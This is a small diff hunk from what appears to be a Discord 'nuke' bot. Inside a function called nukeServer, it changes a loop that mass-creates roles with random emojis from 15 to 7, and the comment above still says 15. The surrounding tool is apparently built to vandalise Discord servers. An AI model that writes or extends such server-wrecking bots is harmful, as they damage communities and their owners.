@@ -95,7 +95,7 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
         
         // Create 15 roles
         const rolePromises = [];
-        for (let i = 0; i < 15; i++) {
+        for (let i = 0; i < 7; i++) {
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
             rolePromises.push(
                 guild.roles.create({
